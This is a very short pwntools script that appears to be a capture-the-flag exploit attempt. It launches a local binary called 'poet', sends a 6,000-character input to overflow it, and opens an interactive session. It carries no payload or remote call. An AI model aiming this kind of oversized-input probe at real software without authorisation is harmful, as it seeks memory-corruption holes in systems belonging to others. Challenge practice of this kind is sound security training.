from pwn import *

p=process('./poet')
def input(a,b):
 p.sendlineafter('> ',a)
 #p.sendlineafter('> ',b)

input('CTF'*2000,'luna')
p.interactive()

